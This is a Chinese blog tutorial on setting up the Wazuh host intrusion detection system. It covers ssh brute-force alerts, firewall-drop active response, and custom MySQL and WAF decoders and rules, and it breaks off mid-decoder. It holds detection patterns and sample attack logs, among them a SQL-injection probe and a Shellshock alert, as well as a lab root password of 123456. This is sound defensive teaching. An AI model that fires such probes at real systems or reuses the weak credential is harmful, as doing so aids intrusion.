<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>开源工具利器之基于主机的IDS：Wazuh - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="开源工具利器之基于主机的IDS：Wazuh" />
<meta property="og:description" content="声明 好好学习，天天向上
好好跟着蜗牛学苑的邓强老师学习技术原理
官网 前身OSSEC https://www.ossec.net/ 现在已开源 https://wazuh.com/ https://github.com/wazuh 安装 基础 yum install curl unzip wget libcap net-tools 配置源 /etc/yum.repos.d/wazuh.repo [wazuh] gpgcheck=1 gpgkey=https://packages.wazuh.com/key/GPG-KEY-WAZUH enabled=1 name=EL-$releasever - Wazuh baseurl=https://packages.wazuh.com/4.x/yum/ protect=1 yum install wazuh-manager 或者官网有离线的rpm包，后续的agent也需要在官网下载 安装完后，启动 systemctl status wazuh-manager 介绍 服务器端安装了wazuh的服务后，服务自动就会采集本台服务器上的信息，服务器上不需要再装agent 默认目录为 cd /var/ossec/ active-response：响应的脚本 agentless：无代理安装，即用户名密码 etc：配置，ossec.conf核心配置文件 ruleset：自带规则库，建议不改 log：日志，预警核心 以下两个目录记录了何时、触发了哪些规则 /var/ossec/logs/alerts/alerts.json：json格式的预警信息，用于分析展示，这不就是给elk用于展示的嘛 /var/ossec/logs/alerts/alerts.log：适用于直接查看 初步感知 hids毕竟是基于主机的ids，所以监控的都是主机上的各种信息，文件夹或者命令执行结果等，看核心配置中的目录监控，可以看到监控了登录日志
/var/ossec/etc/ossec.conf 模拟登录失败，看看有什么反应 实时查看日志 tail -f alerts.log ssh到这台服务器上，输入错误密码 ssh root@192.168.174.5 可以看到触发了两条规则5557和5760 在这个文件里面看到5557规则 /var/ossec/ruleset/rules/0085-pam_rules.xml 这个文件是5760 /var/ossec/ruleset/rules/0095-sshd_rules.xml 当我们连续登录root，密码输错很多次次后报了一条5763
5763规则是如果5760触发，120秒内触发8次，就触发本条规则，描述就是怀疑暴力破解 配置了解 全局配置 /var/ossec/etc/ossec." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/42812cf186e07a10e63c4cafa4aca4a9/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-04-20T15:23:39+08:00" />
<meta property="article:modified_time" content="2023-04-20T15:23:39+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">开源工具利器之基于主机的IDS：Wazuh</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h2><a id="_0"></a>声明</h2> 
<p>好好学习，天天向上<br> 好好跟着蜗牛学苑的邓强老师学习技术原理</p> 
<h2><a id="_4"></a>官网</h2> 
<pre><code>前身OSSEC
https://www.ossec.net/

现在已开源
https://wazuh.com/
https://github.com/wazuh
</code></pre> 
<h2><a id="_19"></a>安装</h2> 
<pre><code>基础
yum install curl unzip wget libcap net-tools

配置源
/etc/yum.repos.d/wazuh.repo

[wazuh]
gpgcheck=1
gpgkey=https://packages.wazuh.com/key/GPG-KEY-WAZUH
enabled=1
name=EL-$releasever - Wazuh
baseurl=https://packages.wazuh.com/4.x/yum/
protect=1

yum install wazuh-manager

或者官网有离线的rpm包，后续的agent也需要在官网下载

安装完后，启动
systemctl status wazuh-manager
</code></pre> 
<h2><a id="_48"></a>介绍</h2> 
<pre><code>服务器端安装了wazuh的服务后，服务自动就会采集本台服务器上的信息，服务器上不需要再装agent
默认目录为
cd /var/ossec/

active-response：响应的脚本
agentless：无代理安装，即用户名密码
etc：配置，ossec.conf核心配置文件
ruleset：自带规则库，建议不改
log：日志，预警核心

以下两个目录记录了何时、触发了哪些规则
/var/ossec/logs/alerts/alerts.json：json格式的预警信息，用于分析展示，这不就是给elk用于展示的嘛
/var/ossec/logs/alerts/alerts.log：适用于直接查看
</code></pre> 
<h3><a id="_70"></a>初步感知</h3> 
<p>hids毕竟是基于主机的ids，所以监控的都是主机上的各种信息，文件夹或者命令执行结果等，看核心配置中的目录监控，可以看到监控了登录日志</p> 
<pre><code>/var/ossec/etc/ossec.conf
</code></pre> 
<p><img src="https://images2.imgbox.com/70/f0/2BijjuNp_o.png" alt="在这里插入图片描述"></p> 
<pre><code>模拟登录失败，看看有什么反应
实时查看日志
tail -f alerts.log

ssh到这台服务器上，输入错误密码
ssh root@192.168.174.5
可以看到触发了两条规则5557和5760
</code></pre> 
<p><img src="https://images2.imgbox.com/10/cc/ZPaUhqp7_o.png" alt="在这里插入图片描述"></p> 
<pre><code>在这个文件里面看到5557规则
/var/ossec/ruleset/rules/0085-pam_rules.xml
这个文件是5760
/var/ossec/ruleset/rules/0095-sshd_rules.xml
</code></pre> 
<p><img src="https://images2.imgbox.com/7f/90/B6OJ48Qv_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/52/a4/ty0qBcmW_o.png" alt="在这里插入图片描述"></p> 
<p>当我们连续登录root，密码输错很多次次后报了一条5763</p> 
<p><img src="https://images2.imgbox.com/fe/fc/jEUPKJgm_o.png" alt="在这里插入图片描述"></p> 
<pre><code>5763规则是如果5760触发，120秒内触发8次，就触发本条规则，描述就是怀疑暴力破解
</code></pre> 
<p><img src="https://images2.imgbox.com/6d/50/2yUnCqxV_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="_145"></a>配置了解</h3> 
<pre><code>全局配置
/var/ossec/etc/ossec.conf
</code></pre> 
<pre><code>  &lt;global&gt;
    &lt;jsonout_output&gt;yes&lt;/jsonout_output&gt;
    
    预警的当然要记录
    &lt;alerts_log&gt;yes&lt;/alerts_log&gt;
    
    不记录所有
    &lt;logall&gt;no&lt;/logall&gt;
    不记录所有的json格式
    &lt;logall_json&gt;no&lt;/logall_json&gt;
    邮件相关配置
    &lt;email_notification&gt;no&lt;/email_notification&gt;
    &lt;smtp_server&gt;smtp.example.wazuh.com&lt;/smtp_server&gt;
    &lt;email_from&gt;wazuh@example.wazuh.com&lt;/email_from&gt;
    &lt;email_to&gt;recipient@example.wazuh.com&lt;/email_to&gt;
    &lt;email_maxperhour&gt;12&lt;/email_maxperhour&gt;
    &lt;email_log_source&gt;alerts.log&lt;/email_log_source&gt;
    
    代理10分钟离线
    &lt;agents_disconnection_time&gt;10m&lt;/agents_disconnection_time&gt;
    代理告警时间为实时
    &lt;agents_disconnection_alert_time&gt;0&lt;/agents_disconnection_alert_time&gt;
  &lt;/global&gt;
</code></pre> 
<pre><code>  &lt;alerts&gt;
  只要预警&gt;=3级及以上就会记录到alert.log中
    &lt;log_alert_level&gt;3&lt;/log_alert_level&gt;
    只要&gt;=12级就会发邮件
    &lt;email_alert_level&gt;12&lt;/email_alert_level&gt;
  &lt;/alerts&gt;
</code></pre> 
<pre><code>客户端连接的端口，所以服务器的1514端口是开着的，可以通过netstat -ant看到
  &lt;remote&gt;
    &lt;connection&gt;secure&lt;/connection&gt;
    &lt;port&gt;1514&lt;/port&gt;
    &lt;protocol&gt;tcp&lt;/protocol&gt;
    &lt;queue_size&gt;131072&lt;/queue_size&gt;
  &lt;/remote&gt;
</code></pre> 
<pre><code>监控root相关
  &lt;!-- Policy monitoring --&gt;
  &lt;rootcheck&gt;
  关闭为no，说明开启了
    &lt;disabled&gt;no&lt;/disabled&gt;
    &lt;check_files&gt;yes&lt;/check_files&gt;
    &lt;check_trojans&gt;yes&lt;/check_trojans&gt;
    &lt;check_dev&gt;yes&lt;/check_dev&gt;
    &lt;check_sys&gt;yes&lt;/check_sys&gt;
    &lt;check_pids&gt;yes&lt;/check_pids&gt;
    &lt;check_ports&gt;yes&lt;/check_ports&gt;
    &lt;check_if&gt;yes&lt;/check_if&gt;

    &lt;!-- Frequency that rootcheck is executed - every 12 hours --&gt;
    每12小时执行一次
    &lt;frequency&gt;43200&lt;/frequency&gt;

监控rootkit（维持root权限的后门）
    &lt;rootkit_files&gt;etc/rootcheck/rootkit_files.txt&lt;/rootkit_files&gt;
    &lt;rootkit_trojans&gt;etc/rootcheck/rootkit_trojans.txt&lt;/rootkit_trojans&gt;

    &lt;skip_nfs&gt;yes&lt;/skip_nfs&gt;
  &lt;/rootcheck&gt;
</code></pre> 
<pre><code>这个文件中就会监控像是ls，ifconfig命令是否被替换成/bin/sh
etc/rootcheck/rootkit_trojans.txt
</code></pre> 
<p><img src="https://images2.imgbox.com/6b/3b/B0Byajbf_o.png" alt="在这里插入图片描述"></p> 
<pre><code>配置文件检查，每12小时扫描一次enabled为yes说明开启了，扫描的文件会在/var/ossec/ruleset/sca
  &lt;sca&gt;
    &lt;enabled&gt;yes&lt;/enabled&gt;
    &lt;scan_on_start&gt;yes&lt;/scan_on_start&gt;
    &lt;interval&gt;12h&lt;/interval&gt;
    &lt;skip_nfs&gt;yes&lt;/skip_nfs&gt;
  &lt;/sca&gt;
</code></pre> 
<p>可以看到sca目录下大多是disabled的</p> 
<p><img src="https://images2.imgbox.com/5b/d8/GspmppB2_o.png" alt="在这里插入图片描述"></p> 
<p>这个规则虽然关闭，可以看到包含检测php的目录下有没有webshell的</p> 
<p><img src="https://images2.imgbox.com/cf/f6/LLI3hVQ7_o.png" alt="在这里插入图片描述"></p> 
<pre><code>扫描操作系统的各种漏洞
  &lt;vulnerability-detector&gt;
    &lt;enabled&gt;no&lt;/enabled&gt;
    &lt;interval&gt;5m&lt;/interval&gt;
    &lt;min_full_scan_interval&gt;6h&lt;/min_full_scan_interval&gt;
    &lt;run_on_start&gt;yes&lt;/run_on_start&gt;

    &lt;!-- Ubuntu OS vulnerabilities --&gt;
    &lt;provider name="canonical"&gt;
      &lt;enabled&gt;no&lt;/enabled&gt;
      &lt;os&gt;trusty&lt;/os&gt;
      &lt;os&gt;xenial&lt;/os&gt;
      &lt;os&gt;bionic&lt;/os&gt;
      &lt;os&gt;focal&lt;/os&gt;
      &lt;os&gt;jammy&lt;/os&gt;
      &lt;update_interval&gt;1h&lt;/update_interval&gt;
    &lt;/provider&gt;

    &lt;!-- Debian OS vulnerabilities --&gt;
    &lt;provider name="debian"&gt;
      &lt;enabled&gt;no&lt;/enabled&gt;
      &lt;os&gt;stretch&lt;/os&gt;
      &lt;os&gt;buster&lt;/os&gt;
      &lt;os&gt;bullseye&lt;/os&gt;
      &lt;update_interval&gt;1h&lt;/update_interval&gt;
    &lt;/provider&gt;

    &lt;!-- RedHat OS vulnerabilities --&gt;
    &lt;provider name="redhat"&gt;
      &lt;enabled&gt;no&lt;/enabled&gt;
      &lt;os&gt;5&lt;/os&gt;
      &lt;os&gt;6&lt;/os&gt;
      &lt;os&gt;7&lt;/os&gt;
      &lt;os&gt;8&lt;/os&gt;
      &lt;os&gt;9&lt;/os&gt;
      &lt;update_interval&gt;1h&lt;/update_interval&gt;
    &lt;/provider&gt;

    &lt;!-- Amazon Linux OS vulnerabilities --&gt;
    &lt;provider name="alas"&gt;
      &lt;enabled&gt;no&lt;/enabled&gt;
      &lt;os&gt;amazon-linux&lt;/os&gt;
      &lt;os&gt;amazon-linux-2&lt;/os&gt;
      &lt;update_interval&gt;1h&lt;/update_interval&gt;
    &lt;/provider&gt;

    &lt;!-- Arch OS vulnerabilities --&gt;
    &lt;provider name="arch"&gt;
      &lt;enabled&gt;no&lt;/enabled&gt;
      &lt;update_interval&gt;1h&lt;/update_interval&gt;
    &lt;/provider&gt;

    &lt;!-- Windows OS vulnerabilities --&gt;
    &lt;provider name="msu"&gt;
      &lt;enabled&gt;yes&lt;/enabled&gt;
      &lt;update_interval&gt;1h&lt;/update_interval&gt;
    &lt;/provider&gt;

    &lt;!-- Aggregate vulnerabilities --&gt;
    &lt;provider name="nvd"&gt;
      &lt;enabled&gt;yes&lt;/enabled&gt;
      &lt;update_from_year&gt;2010&lt;/update_from_year&gt;
      &lt;update_interval&gt;1h&lt;/update_interval&gt;
    &lt;/provider&gt;

  &lt;/vulnerability-detector&gt;
</code></pre> 
<p>再往后就是大量的目录检查，注意配置文件的注释是，我203行注释写错了后面重启wazuh就会报错，和html的注释一样</p> 
<pre><code>&lt;!-- --&gt;
</code></pre> 
<p><img src="https://images2.imgbox.com/52/1e/LPQB5bBm_o.png" alt="在这里插入图片描述"></p> 
<p>以及主动响应的部分</p> 
<p><img src="https://images2.imgbox.com/bc/9c/rBoFYqMq_o.png" alt="在这里插入图片描述"></p> 
<p>当然主动响应也会和目录对上，这里就相当于定义了，但是没有地方调用</p> 
<p><img src="https://images2.imgbox.com/0f/47/noANzeTc_o.png" alt="在这里插入图片描述"></p> 
<p>这里才是要调用</p> 
<p><img src="https://images2.imgbox.com/69/15/RwNXCc3F_o.png" alt="在这里插入图片描述"></p> 
<p>命令执行的结果</p> 
<p><img src="https://images2.imgbox.com/81/2c/enGmxElv_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="_401"></a>主动响应</h3> 
<p>官网配置搜索&lt;active-response&gt;</p> 
<p><img src="https://images2.imgbox.com/40/4c/C03pSPly_o.png" alt="在这里插入图片描述"></p> 
<p>拷贝这个规则到配置中</p> 
<p><img src="https://images2.imgbox.com/03/90/m11UChMQ_o.png" alt="在这里插入图片描述"></p> 
<p>顺便了解一下location标签</p> 
<p>local，在该代理上执行，我们可以用这个</p> 
<p>server在wazuh服务器上执行，也可以用，因为我们现在就在server上测试的，不过如果是在agent触发了，一般很少让在server上执行吧</p> 
<p>defined-agent，在定义agent_id上面执行，其实也可以，默认给我们的就是带agent_id的我就不改了</p> 
<p>all，在所有agent上执行，很适合大面积感染了</p> 
<p><img src="https://images2.imgbox.com/6a/9f/B2cSPsyu_o.png" alt="在这里插入图片描述"></p> 
<p>简单修改一下为，出现10级了，触发firewall-drop，将那个IP加入到iptables防火墙规则里</p> 
<p><img src="https://images2.imgbox.com/5b/23/63nAiZ7R_o.png" alt="在这里插入图片描述"></p> 
<pre><code>&lt;active-response&gt;
  &lt;command&gt;firewall-drop&lt;/command&gt;
  &lt;location&gt;local&lt;/location&gt;
  &lt;level&gt;7&lt;/level&gt;
  &lt;timeout&gt;600&lt;/timeout&gt;
&lt;/active-response&gt;
</code></pre> 
<p>重启wazuh，开启iptables</p> 
<pre><code>systemctl restart wazuh-manager

systemctl start iptables
</code></pre> 
<p>我们还用前面的哪个10级的5760，也就是ssh一直失败，先是触发了10级的规则</p> 
<p><img src="https://images2.imgbox.com/e5/a6/xmCRUV1e_o.png" alt="在这里插入图片描述"></p> 
<p>客户端ssh再访问也没响应了</p> 
<p><img src="https://images2.imgbox.com/66/ef/og3ubyla_o.png" alt="在这里插入图片描述"></p> 
<p>从日志看是加入到了防火墙里面</p> 
<p><img src="https://images2.imgbox.com/85/df/Osv46rl9_o.png" alt="在这里插入图片描述"></p> 
<p>查看防火墙策略加了两条drop</p> 
<p><img src="https://images2.imgbox.com/f3/8e/pvnkwGyC_o.png" alt="在这里插入图片描述"></p> 
<p>重启iptables恢复策略</p> 
<pre><code>systemctl restart iptables
</code></pre> 
<p>再试一下host-deny，一样的结果</p> 
<p><img src="https://images2.imgbox.com/0f/53/eICaCJmU_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/3f/aa/Llsb0cDX_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/5e/ab/f188JHMM_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/8b/91/J3ExMoK5_o.png" alt="在这里插入图片描述"></p> 
<p>重启sshd服务恢复deny，如果是测试，我们就把响应再注释掉</p> 
<pre><code>systemctl restart sshd
</code></pre> 
<p>如果重启了sshd还不管用，就考虑加入hosts.allow</p> 
<pre><code>vim /etc/hosts.allow

sshd:192.168.174.1
</code></pre> 
<h2><a id="_554"></a>应用</h2> 
<h3><a id="mysql_558"></a>mysql</h3> 
<pre><code>启动xampp
/opt/lampp/lampp start
</code></pre> 
<p>开启mysql日志，输出到文件</p> 
<pre><code>vim /opt/lampp/etc/my.cnf

general_log = ON
general_log_file = /opt/lampp/logs/mysql.log
log_output = file

加入可写权限
chmod +w /opt/lampp/logs

重启lampp
/opt/lampp/lampp restart
</code></pre> 
<pre><code>如果没反应就进mysql里面再设置一下
mysql -uroot -p123456 -h192.168.174.5
show variables like 'general_log';
show variables like 'general_log_file';
show variables like 'log_output';
set global general_log=on
set global general_log_file='/opt/lampp/logs/mysql.log';
</code></pre> 
<p>登录失败后会产生日志</p> 
<p><img src="https://images2.imgbox.com/37/c7/WL8OSnp8_o.png" alt="在这里插入图片描述"></p> 
<p>启动wazuh的mysql日志监听</p> 
<pre><code>  &lt;localfile&gt;
    &lt;log_format&gt;syslog&lt;/log_format&gt;
    &lt;location&gt;/opt/lampp/logs/mysql.log&lt;/location&gt;
  &lt;/localfile&gt;
</code></pre> 
<p><img src="https://images2.imgbox.com/91/0b/OQdYpF6w_o.png" alt="在这里插入图片描述"></p> 
<p>查看内置mysql的规则，可以看到很多规则都是依赖50100，50100是个解码器，我们要触发的日志也是50106，不过这些正则和我们上面触发的mysql日志似乎匹配不上没有MYSQL开头的这种关键字</p> 
<pre><code>/var/ossec/ruleset/rules/0295-mysql_rules.xml
</code></pre> 
<p><img src="https://images2.imgbox.com/7c/f1/noz9vCLf_o.png" alt="在这里插入图片描述"></p> 
<p>找到罪魁祸首mysql的decoders，改成匹配上我们日志的正则</p> 
<pre><code>/var/ossec/ruleset/decoders/0150-mysql_decoders.xml

&lt;decoder name="mysql_log"&gt;
  &lt;prematch&gt;\d+ Connect&lt;/prematch&gt;
&lt;/decoder&gt;
</code></pre> 
<p><img src="https://images2.imgbox.com/84/ae/vRwknSb6_o.png" alt="在这里插入图片描述"></p> 
<p>再整一条登录错误日志</p> 
<pre><code>mysql -uroot -p1234561 -h192.168.174.5
</code></pre> 
<p><img src="https://images2.imgbox.com/21/9d/XVNbWULX_o.png" alt="在这里插入图片描述"></p> 
<p>触发了50106</p> 
<p><img src="https://images2.imgbox.com/78/fd/tAC49Dlf_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="_680"></a>解码器</h3> 
<h4><a id="_682"></a>静态字段与动态字段</h4> 
<pre><code>https://documentation.wazuh.com/current/user-manual/ruleset/dynamic-fields.html?highlight=static

静态字段
wazuh预定义的为静态字段：像是user、srcip

动态字段
不包含预定义的为动态字段，也就是除了user、srcip等等系统自定义的13个静态字段之外其他的都是动态字段，也就是我们自己定义的
</code></pre> 
<h4><a id="_700"></a>正则</h4> 
<p>利用正则对日志进行解析，利于上一个例子中，我们可以提取日志中的字段</p> 
<pre><code>&lt;decoder name="mysql_log"&gt;
  &lt;prematch&gt;\d+ Connect&lt;/prematch&gt;
  &lt;regex offset="after_prematch"&gt;Access denied for user '(\S+)'@'(\S+)' &lt;/regex&gt;
  &lt;order&gt;username, src_ip&lt;/order&gt;
&lt;/decoder&gt;
</code></pre> 
<p><img src="https://images2.imgbox.com/82/0a/unXeHlZ4_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="json_721"></a>json</h4> 
<p>自带的正则解码器，表示以花括号开头{，解码器命名为json</p> 
<p><img src="https://images2.imgbox.com/a6/5e/4xuuBCNO_o.png" alt="在这里插入图片描述"></p> 
<p>suricata这里就引用了这个名为json的解码器</p> 
<p><img src="https://images2.imgbox.com/a9/48/L2UcD9Fv_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="_741"></a>命令行调试</h4> 
<pre><code>/var/ossec/bin/wazuh-logtest
</code></pre> 
<p>命令执行后，在控制台输入一条mysql登录失败的日志</p> 
<pre><code>5 Connect   Access denied for user 'root'@'192.168.174.1' (using password: YES)
</code></pre> 
<p>第一阶段，预解码</p> 
<p>第二阶段，解码器</p> 
<p>第三阶段，对规则进行匹配</p> 
<p>最后会说预警将产生，意思是这条日志匹配上了alert规则，但是只是测试，alert不会真正发生</p> 
<p><img src="https://images2.imgbox.com/a6/8e/8YWYJZnt_o.png" alt="在这里插入图片描述"></p> 
<p>再输入一条json格式的日志，json的格式会被自动提取，event_type字段是alert，自然会匹配上86601规则</p> 
<pre><code>{"timestamp":"2016-05-02T17:46:48.515262+0000","flow_id":1234,"in_iface":"eth0","event_type":"alert","src_ip":"16.10.10.10","src_port":5555,"dest_ip":"16.10.10.11","dest_port":80,"proto":"TCP","alert":{"action":"allowed","gid":1,"signature_id":2019236,"rev":3,"signature":"ET WEB_SERVER Possible CVE-2014-6271 Attempt in HTTP Version Number","category":"Attempted Administrator Privilege Gain","severity":1},"payload":"abcde","payload_printable":"hi test","stream":0,"host":"suricata.com"}
</code></pre> 
<p><img src="https://images2.imgbox.com/4b/0b/IJmlJW9s_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="sibling_791"></a>同级sibling解码器</h4> 
<p>在这个文件下自定义解码器</p> 
<pre><code>/var/ossec/etc/decoders/local_decoder.xml
</code></pre> 
<p>解码器名称为securityapp，program_name表示只要包含securityapp的都解码</p> 
<pre><code>&lt;decoder name="securityapp"&gt;
    &lt;program_name&gt;securityapp&lt;/program_name&gt;
    &lt;regex&gt;(\w+): srcuser="(\.+)" action="(\.+)" dstusr="(\.+)"&lt;/regex&gt;
    &lt;order&gt;type,srcuser,action,dstuser&lt;/order&gt;
&lt;/decoder&gt;
</code></pre> 
<p><img src="https://images2.imgbox.com/d4/45/DWXTZphf_o.png" alt="在这里插入图片描述"></p> 
<p>源日志为，按照顺序（order）获取了四个字段的值</p> 
<pre><code>Apr 01 00:31:38 hostname10086 securityapp: INFO: srcuser="Bob" action="called" dstusr="Alice"
</code></pre> 
<p><img src="https://images2.imgbox.com/8c/38/5SOoMlZT_o.png" alt="在这里插入图片描述"></p> 
<p>但是将日志更换顺序后，则无法匹配</p> 
<pre><code>Apr 01 00:31:38 hostname10086 securityapp: INFO: srcuser="Bob" dstusr="Alice" action="called"
</code></pre> 
<p><img src="https://images2.imgbox.com/93/44/TIpFFYH0_o.png" alt="在这里插入图片描述"></p> 
<p>先将刚刚这个解码器注释掉，加入新的多级解码器，一个一个字段拿</p> 
<p>定义一个父securityapp</p> 
<pre><code>&lt;decoder name="securityapp"&gt;
    &lt;program_name&gt;securityapp&lt;/program_name&gt;
&lt;/decoder&gt;

&lt;decoder name="securityapp"&gt;
    &lt;parent&gt;securityapp&lt;/parent&gt;
    &lt;regex&gt;^(\w+):&lt;/regex&gt;
    &lt;order&gt;type&lt;/order&gt;
&lt;/decoder&gt;

&lt;decoder name="securityapp"&gt;
    &lt;parent&gt;securityapp&lt;/parent&gt;
    &lt;regex&gt;srcuser="(\.+)"&lt;/regex&gt;
    &lt;order&gt;srcuser&lt;/order&gt;
&lt;/decoder&gt;

&lt;decoder name="securityapp"&gt;
    &lt;parent&gt;securityapp&lt;/parent&gt;
    &lt;regex&gt;action="(\.+)"&lt;/regex&gt;
    &lt;order&gt;action&lt;/order&gt;
&lt;/decoder&gt;

&lt;decoder name="securityapp"&gt;
    &lt;parent&gt;securityapp&lt;/parent&gt;
    &lt;regex&gt;dstusr="(\.+)"&lt;/regex&gt;
    &lt;order&gt;dstusr&lt;/order&gt;
&lt;/decoder&gt;
</code></pre> 
<p>重启wazuh，可以提取</p> 
<pre><code>Apr 01 00:31:38 hostname10086 securityapp: INFO: srcuser="Bob" dstusr="Alice" action="called"
</code></pre> 
<p><img src="https://images2.imgbox.com/1c/2f/JxSUURZD_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="_905"></a>自定义</h4> 
<p>给定日志</p> 
<pre><code>Dec  4 17:07:01 myserver security_login: Accepted password for user tony, IP: 1.2.3.4
Dec  4 17:07:01 myserver security_login: Failed password for user tony, IP: 1.2.3.4
</code></pre> 
<p>加入解码器后，重启wazuh</p> 
<pre><code>&lt;decoder name="security_login"&gt;
    &lt;program_name&gt;security_login&lt;/program_name&gt;
&lt;/decoder&gt;
&lt;decoder name="security_login_message"&gt;
    &lt;parent&gt;security_login&lt;/parent&gt;
    &lt;prematch&gt; password for user &lt;/prematch&gt;
    &lt;regex&gt;^\w+ password for user (\w+), IP: (\S+)&lt;/regex&gt;
    &lt;order&gt;dstuser, srcip&lt;/order&gt;
&lt;/decoder&gt;
</code></pre> 
<p>这两条“人造日志”好像还装上了我们的规则</p> 
<p><img src="https://images2.imgbox.com/05/2b/V5JJhNBL_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="_945"></a>实战</h4> 
<p>对于软waf的日志，加个waflog特征后</p> 
<pre><code>Dec 25 20:45:02 MyHost waflog: [2022-05-09 15:47:43] "GET 127.0.0.1/?a=select1from1" "1.1.1.1"  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0" "select.+(from|limit)"
</code></pre> 
<p>完善解码器/var/ossec/etc/decoders/local_decoder.xml</p> 
<pre><code>&lt;decoder name="waflog"&gt;
  &lt;parent&gt;waflog&lt;/parent&gt;
  &lt;regex&gt;[(\.*)] "(\w+) (\.*)" "(\S*)"  "(\.*)" "(\.*)"&lt;/regex&gt;
  &lt;order&gt;accress_time,method,uri,useless,user-agent,waf_rule&lt;/order&gt;
&lt;/decoder&gt;
</code></pre> 
<p>完善/var/ossec/etc/rules/local_rules.xml</p> 
<pre><code>&lt;group name="ossec,"&gt;
  &lt;rule id="300001" level="3"&gt;
        &lt;decoded_as&gt;waflog&lt;/decoded_as&gt;
        &lt;field name="accress_time"&gt;\.+&lt;/field&gt;
        &lt;field name="waf_rule"&gt;\.+&lt;/field&gt;
        &lt;description&gt;waf messages.&lt;/description&gt;
        &lt;options&gt;no_full_log&lt;/options&gt;
  &lt;/rule&gt;
  &lt;rule id="300002" level="10"&gt;
    &lt;if_sid&gt;300001&lt;/if_sid&gt;
    &lt;field name="waf_rule"&gt;^select.+\(from\|limit\)&lt;/field&gt;
    &lt;description&gt;sql inject: Alert - waf_rule is : $(waf_rule)&lt;/description&gt;
    &lt;options&gt;no_full_log&lt;/options&gt;
&lt;/rule&gt; 
&lt;/group&gt;
</code></pre> 
<p>如果是要进行host-deny响应，我们就要给定一个srcip，不然把啥加到deny中呢</p> 
<h3><a id="_999"></a>规则</h3> 
<p>分级</p> 
<pre><code>https://documentation.wazuh.com/current/user-manual/ruleset/rules-classification.html?highlight=First%20time%20seen

0-15个级别（没有1级）
3级以前基本就是提示
7级以后较为严重
</code></pre> 
<pre><code>rule标签
https://documentation.wazuh.com/current/user-manual/ruleset/ruleset-xml-syntax/rules.html?highlight=rule

上述url中就是rule标签中所有的标签，当然里面大多是静态字段filed（解码器的order中拿到的）
match和regex都是正则，match只有简单几个表达式，所以我们常用regex
用户自定义的规则id从100000开始

ignore静默时间
overwrite重写规则，觉得系统哪个写的不好，自己写一个，有更改需求的最好还是使用重写的方式
</code></pre> 
<p>针对mysql进行实验，我们注释掉最初在mysql的编码器中写的decoder，恢复其默认编码器，改在/var/ossec/etc/decoders/local_decoder.xml中操作</p> 
<p><img src="https://images2.imgbox.com/e6/6b/f4OUItEv_o.png" alt="在这里插入图片描述"></p> 
<p>编辑/var/ossec/etc/ossec.conf，禁用原mysql编码器和mysql的规则</p> 
<pre><code>    &lt;rule_exclude&gt;0295-mysql_rules.xml&lt;/rule_exclude&gt;
	&lt;decoder_exclude&gt;ruleset/decoders/0150-mysql_decoders.xml&lt;/decoder_exclude&gt;
</code></pre> 
<p>ossec.conf完整ruleset</p> 
<pre><code>  &lt;ruleset&gt;
    &lt;!-- Default ruleset --&gt;
    &lt;decoder_dir&gt;ruleset/decoders&lt;/decoder_dir&gt;
    &lt;rule_dir&gt;ruleset/rules&lt;/rule_dir&gt;
    &lt;rule_exclude&gt;0215-policy_rules.xml&lt;/rule_exclude&gt;

    &lt;rule_exclude&gt;0295-mysql_rules.xml&lt;/rule_exclude&gt;

    &lt;list&gt;etc/lists/audit-keys&lt;/list&gt;
    &lt;list&gt;etc/lists/amazon/aws-eventnames&lt;/list&gt;
    &lt;list&gt;etc/lists/security-eventchannel&lt;/list&gt;

    &lt;!-- User-defined ruleset --&gt;
    &lt;decoder_dir&gt;etc/decoders&lt;/decoder_dir&gt;
    &lt;rule_dir&gt;etc/rules&lt;/rule_dir&gt;

    &lt;decoder_exclude&gt;ruleset/decoders/0150-mysql_decoders.xml&lt;/decoder_exclude&gt;
  &lt;/ruleset&gt;
</code></pre> 
<p><img src="https://images2.imgbox.com/19/99/ajp8lDww_o.png" alt="在这里插入图片描述"></p> 
<p>在自定义解码器中接入mysql的解码器，这里拿到登录的用户名和ip，注意user和srcip要和官网的静态字段保持一致</p> 
<p>/var/ossec/etc/decoders/local_decoder.xml</p> 
<pre><code>&lt;decoder name="mysql_log"&gt;
  &lt;prematch&gt;\d+ Connect|\d+ Query&lt;/prematch&gt;
